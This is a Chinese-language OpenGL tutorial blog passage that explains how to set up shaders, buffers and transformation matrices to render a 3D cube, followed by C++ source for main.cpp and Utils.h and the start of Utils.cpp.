<h2 id="程序初始化"><a href="#程序初始化" class="headerlink" title="程序初始化"></a>程序初始化</h2><h3 id="创建-Shader-对象"><a href="#创建-Shader-对象" class="headerlink" title="创建 Shader 对象"></a>创建 Shader 对象</h3><p>首先使用 <code>glCreateShader（）</code> 创建一个 Shader 对象，并通过枚举类型 shaderType 指定 Shader 类型（<code>GL_VERTEX_SHADER</code> 或者 <code>GL_FRAGMENT_SHADER</code>），再使用 <code>glShaderSource（）;</code>，利用 string 来替换 shader 对象的源代码，此处的 string 可以直接硬编码于 C++ 程序中，但在代码量较多时硬编码显然不合适，应该将其编码于一个专门的 glsl 文件中，并使用 C++ 的文件输入流 ifstream进行读取操作。</p>
<h3 id="编译-Shader-对象"><a href="#编译-Shader-对象" class="headerlink" title="编译 Shader 对象"></a>编译 Shader 对象</h3><p>在得到了包含源代码的 Shader 对象后，就需要将其编译了，编译使用 <code>glCompileShader（）</code>. 由于 Shader 是运行在 GPU 上的代码，因此当编译出错时 C++ 程序也不会崩溃，只是无法正常输出，因此这里我们可以使用 <code>glGetShaderiv（）</code> 获取 shader 的编译状态(<code>GL_COMPILE_STATUS</code>)，若编译出错则输出错误信息。</p>
<h3 id="创建并链接-program-对象"><a href="#创建并链接-program-对象" class="headerlink" title="创建并链接 program 对象"></a>创建并链接 program 对象</h3><p>最后创建 program 对象，使用 <code>glCreateProgram（）</code> . 并使用 <code>glAttachShader（）</code>, 将之前创建的 Shader 对象附加到 program 上，使用 <code>glLinkProgram（）</code> 链接 program 对象，链接过程同样可能失败，因此可通过 <code>glGetProgramiv（）</code> 获取链接状态。</p>
<h3 id="创建并激活-VAO-与-VBO"><a href="#创建并激活-VAO-与-VBO" class="headerlink" title="创建并激活 VAO 与 VBO"></a>创建并激活 VAO 与 VBO</h3><p>VBO 是<strong>顶点缓冲对象</strong>（Vertex Buffer Object），里面存储了一系列图形数据，包括顶点坐标等，一个场景通常需要多个 VBO. 而 VAO 是<strong>顶点数组对象</strong>（Vertex Array Object），它是一种组织缓冲区的方法，在此项目中只需要一个。</p>
<p>VBO 使用 <code>glGenBuffers()</code> 创建，使用 <code>glBindBuffers()</code> 激活；VAO 使用 <code>glGenVertexArrays()</code> 创建，使用 <code>glBindVertexArrays()</code> 激活。一个立方体包含 36 个顶点（一个立方体由 12 个三角形组成），这里直接由数组给出，并使用 <code>glBufferData()</code> 将顶点坐标传递给缓冲区。</p>
<h2 id="渲染过程"><a href="#渲染过程" class="headerlink" title="渲染过程"></a>渲染过程</h2><p>渲染过程在程序开始后将会不断执行，每一次执行都将刷新当前显示的内容，调用渲染过程的频率也就是帧数。</p>
<h3 id="启用-program-对象"><a href="#启用-program-对象" class="headerlink" title="启用 program 对象"></a>启用 program 对象</h3><p>首先需要先使用 <code>glClear()</code> 清除深度缓冲区，否则在进行隐藏面消除时可能会使得每个曲面都被移除从而导致黑屏，再调用 <code>glUseProgram()</code> 来启用 program 对象。</p>
<h3 id="构建矩阵"><a href="#构建矩阵" class="headerlink" title="构建矩阵"></a>构建矩阵</h3><p>要将一个三维物体准确地渲染到屏幕，通常需要使用透视矩阵、模型矩阵、视图矩阵对坐标点进行变换。</p>
<p>首先是透视矩阵（proj_matrix），GLM 库中包含了一个用于构建透视矩阵的函数 <code>glm::perspective()</code>，参数需要纵横比、视场（FOV）、近剪裁平面的距离、远剪裁平面的距离。需要注意的是，此处的 FOV 单位是弧度。</p>
<p>其次是模型矩阵和视图矩阵，通常我们将这两个矩阵合并成为模型-视图矩阵（mv_matrix）。模型矩阵为一个平移 (cubeLocX, cubeLocY, cubeLocZ) 的平移矩阵，视图矩阵为一个平移 (-cameraX, -cameraY, -cameraZ) 的平移矩阵，都可以使用 <code>glm::translate()</code> 构造。</p>
<h3 id="将矩阵复制给统一变量"><a href="#将矩阵复制给统一变量" class="headerlink" title="将矩阵复制给统一变量"></a>将矩阵复制给统一变量</h3><p>统一变量在 Shader 代码中使用 <strong>uniform</strong> 关键字声明，是一系列顶点的一个统一的属性。</p>
<p>首先使用 <code>glGetUniformLocation()</code> 获取 Shader 中统一变量的引用，再使用 <code>glUniformMatrix4fv()</code> 将上一步构建的矩阵复制给统一变量。 </p>
<p>Shader 在获取到变换矩阵之后，便计算得到渲染时每个点的实际位置，这个变量在 OpenGL 中已经预先定义，名为 <strong>gl_Position</strong>，可得 <code>gl_Position = proj_matrix * mv_matrix * vec4(position, 1.0)</code>，此处的 postion 为立方体预期的顶点坐标，在下一步中将会传入。</p>
<h3 id="将-VBO-关联给顶点属性"><a href="#将-VBO-关联给顶点属性" class="headerlink" title="将 VBO 关联给顶点属性"></a>将 VBO 关联给顶点属性</h3><p>首先激活特定的 VBO，再使用 <code>glVertexAttribPointer()</code> 将 VBO 中的数据传送给每一个顶点的顶点着色器的特定变量，这个变量根据 <code>layout (location = n)</code> 来指定 n 号位置。</p>
<p>同时，这里还需要使用 <code>glEnableVertexAttribArray()</code> 来启用此 n 号位置的变量。 </p>
<h3 id="顶点属性插值"><a href="#顶点属性插值" class="headerlink" title="顶点属性插值"></a>顶点属性插值</h3><p>顶点着色器输出的变换过后的顶点坐标 gl_Position 到达光栅着色器并光栅化之后，片段的具体像素位置到达片段着色器，并使用片段着色器中输出的颜色属性进行着色。</p>
<h3 id="绘制模型"><a href="#绘制模型" class="headerlink" title="绘制模型"></a>绘制模型</h3><p>最终，使用 <code>glDrawArrays()</code> 绘制模型，图元类型选择三角形（GL_TRIANGLES）.</p>
<h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p><img src="/2022/01/19/%E4%BD%BF%E7%94%A8OpenGL%E6%B8%B2%E6%9F%93%E4%B8%80%E4%B8%AA%E7%AB%8B%E6%96%B9%E4%BD%93/res.png"></p>
<h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><h2 id="main-cpp"><a href="#main-cpp" class="headerlink" title="main.cpp"></a>main.cpp</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">GLEW_STATIC</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;fstream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cmath></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;glm/glm.hpp></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;glm/gtc/type_ptr.hpp></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;glm/gtc/matrix_transform.hpp></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;GL/glew.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;GLFW/glfw3.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"Utils.h"</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">numVAOs</span> <span class="token expression"><span class="token number">1</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">numVBOs</span> <span class="token expression"><span class="token number">2</span></span></span>

<span class="token keyword">float</span> cameraX<span class="token punctuation">,</span> cameraY<span class="token punctuation">,</span> cameraZ<span class="token punctuation">;</span>
<span class="token keyword">float</span> cubeLocX<span class="token punctuation">,</span> cubeLocY<span class="token punctuation">,</span> cubeLocZ<span class="token punctuation">;</span>
GLuint renderingProgram<span class="token punctuation">;</span>
GLuint vao<span class="token punctuation">[</span>numVAOs<span class="token punctuation">]</span><span class="token punctuation">;</span>
GLuint vbo<span class="token punctuation">[</span>numVBOs<span class="token punctuation">]</span><span class="token punctuation">;</span>

GLuint mvLoc<span class="token punctuation">,</span> projLoc<span class="token punctuation">;</span>
<span class="token keyword">int</span> width<span class="token punctuation">,</span> height<span class="token punctuation">;</span>
<span class="token keyword">float</span> aspect<span class="token punctuation">;</span>
glm<span class="token double-colon punctuation">::</span>mat4 pMat<span class="token punctuation">,</span> vMat<span class="token punctuation">,</span> mMat<span class="token punctuation">,</span> mvMat<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">setupVertices</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">float</span> vertexPositions<span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
		<span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span>
		<span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span>
		<span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span>
		<span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span>
		<span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span>
		<span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span>
		<span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span>
		<span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span>
		<span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span>
		<span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span>
		<span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span>
		<span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.0f</span><span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
	<span class="token function">glGenVertexArrays</span><span class="token punctuation">(</span>numVAOs<span class="token punctuation">,</span> vao<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glBindVertexArray</span><span class="token punctuation">(</span>vao<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glGenBuffers</span><span class="token punctuation">(</span>numVBOs<span class="token punctuation">,</span> vbo<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">glBindBuffer</span><span class="token punctuation">(</span>GL_ARRAY_BUFFER<span class="token punctuation">,</span> vbo<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glBufferData</span><span class="token punctuation">(</span>GL_ARRAY_BUFFER<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>vertexPositions<span class="token punctuation">)</span><span class="token punctuation">,</span> vertexPositions<span class="token punctuation">,</span> GL_STATIC_DRAW<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span>GLFWwindow<span class="token operator">*</span> window<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	renderingProgram <span class="token operator">=</span> <span class="token function">createShaderProgram</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	cameraX <span class="token operator">=</span> <span class="token number">0.0f</span><span class="token punctuation">;</span> cameraY <span class="token operator">=</span> <span class="token number">0.0f</span><span class="token punctuation">;</span> cameraZ <span class="token operator">=</span> <span class="token number">8.0f</span><span class="token punctuation">;</span>
	cubeLocX <span class="token operator">=</span> <span class="token number">0.0f</span><span class="token punctuation">;</span> cubeLocY <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2.0f</span><span class="token punctuation">;</span> cubeLocZ <span class="token operator">=</span> <span class="token number">0.0f</span><span class="token punctuation">;</span> <span class="token comment">// 沿 Y 轴下移以展示透视</span>
	<span class="token function">setupVertices</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">display</span><span class="token punctuation">(</span>GLFWwindow<span class="token operator">*</span> window<span class="token punctuation">,</span> <span class="token keyword">double</span> currentTime<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">glClear</span><span class="token punctuation">(</span>GL_DEPTH_BUFFER_BIT<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glUseProgram</span><span class="token punctuation">(</span>renderingProgram<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token comment">// 获取 MV 矩阵和投影矩阵的统一变量</span>
	mvLoc <span class="token operator">=</span> <span class="token function">glGetUniformLocation</span><span class="token punctuation">(</span>renderingProgram<span class="token punctuation">,</span> <span class="token string">"mv_matrix"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	projLoc <span class="token operator">=</span> <span class="token function">glGetUniformLocation</span><span class="token punctuation">(</span>renderingProgram<span class="token punctuation">,</span> <span class="token string">"proj_matrix"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// 构建透视矩阵</span>
	<span class="token function">glfwGetFramebufferSize</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> <span class="token operator">&amp;</span>width<span class="token punctuation">,</span> <span class="token operator">&amp;</span>height<span class="token punctuation">)</span><span class="token punctuation">;</span>
	aspect <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span>width <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span>height<span class="token punctuation">;</span>
	pMat <span class="token operator">=</span> glm<span class="token double-colon punctuation">::</span><span class="token function">perspective</span><span class="token punctuation">(</span><span class="token number">1.0472f</span><span class="token punctuation">,</span> aspect<span class="token punctuation">,</span> <span class="token number">0.1f</span><span class="token punctuation">,</span> <span class="token number">1000.0f</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1.0472 radians = 60 degrees</span>

	<span class="token comment">// 构建视图矩阵、模型矩阵和视图-模型矩阵</span>
	vMat <span class="token operator">=</span> glm<span class="token double-colon punctuation">::</span><span class="token function">translate</span><span class="token punctuation">(</span>glm<span class="token double-colon punctuation">::</span><span class="token function">mat4</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> glm<span class="token double-colon punctuation">::</span><span class="token function">vec3</span><span class="token punctuation">(</span><span class="token operator">-</span>cameraX<span class="token punctuation">,</span> <span class="token operator">-</span>cameraY<span class="token punctuation">,</span> <span class="token operator">-</span>cameraZ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	mMat <span class="token operator">=</span> glm<span class="token double-colon punctuation">::</span><span class="token function">translate</span><span class="token punctuation">(</span>glm<span class="token double-colon punctuation">::</span><span class="token function">mat4</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> glm<span class="token double-colon punctuation">::</span><span class="token function">vec3</span><span class="token punctuation">(</span>cubeLocX<span class="token punctuation">,</span> cubeLocY<span class="token punctuation">,</span> cubeLocZ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	mvMat <span class="token operator">=</span> vMat <span class="token operator">*</span> mMat<span class="token punctuation">;</span>

	<span class="token comment">// 将透视矩阵和 MV 矩阵复制给相应的统一变量</span>
	<span class="token function">glUniformMatrix4fv</span><span class="token punctuation">(</span>mvLoc<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> GL_FALSE<span class="token punctuation">,</span> glm<span class="token double-colon punctuation">::</span><span class="token function">value_ptr</span><span class="token punctuation">(</span>mvMat<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glUniformMatrix4fv</span><span class="token punctuation">(</span>projLoc<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> GL_FALSE<span class="token punctuation">,</span> glm<span class="token double-colon punctuation">::</span><span class="token function">value_ptr</span><span class="token punctuation">(</span>pMat<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// 将 VBO 关联给顶点着色器中相应的顶点属性</span>
	<span class="token function">glBindBuffer</span><span class="token punctuation">(</span>GL_ARRAY_BUFFER<span class="token punctuation">,</span> vbo<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glVertexAttribPointer</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> GL_FLOAT<span class="token punctuation">,</span> GL_FALSE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glEnableVertexAttribArray</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// 调整 OpenGL 位置，绘制模型</span>
	<span class="token function">glEnable</span><span class="token punctuation">(</span>GL_DEPTH_TEST<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glDepthFunc</span><span class="token punctuation">(</span>GL_LEQUAL<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glDrawArrays</span><span class="token punctuation">(</span>GL_TRIANGLES<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">glfwInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token function">glfwWindowHint</span><span class="token punctuation">(</span>GLFW_CONTEXT_VERSION_MAJOR<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glfwWindowHint</span><span class="token punctuation">(</span>GLFW_CONTEXT_VERSION_MINOR<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	GLFWwindow<span class="token operator">*</span> window <span class="token operator">=</span> <span class="token function">glfwCreateWindow</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span> <span class="token number">600</span><span class="token punctuation">,</span> <span class="token string">"Chapter2 - program1"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glfwMakeContextCurrent</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">glewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> GLEW_OK<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token function">glfwSwapInterval</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">init</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">glfwWindowShouldClose</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">display</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> <span class="token function">glfwGetTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">glfwSwapBuffers</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">glfwPollEvents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token function">glfwDestroyWindow</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glfwTerminate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h2 id="Utils-h"><a href="#Utils-h" class="headerlink" title="Utils.h"></a>Utils.h</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">once</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;GLFW/glfw3.h></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

GLuint <span class="token function">createShaderProgram</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

string <span class="token function">readShaderSource</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">printShaderLog</span><span class="token punctuation">(</span>GLuint shader<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">printProgramLog</span><span class="token punctuation">(</span><span class="token keyword">int</span> prog<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">bool</span> <span class="token function">checkOpenGLError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<h2 id="Utils-cpp"><a href="#Utils-cpp" class="headerlink" title="Utils.cpp"></a>Utils.cpp</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">GLEW_STATIC</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;fstream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;GL/glew.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;GLFW/glfw3.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"Utils.h"</span></span>

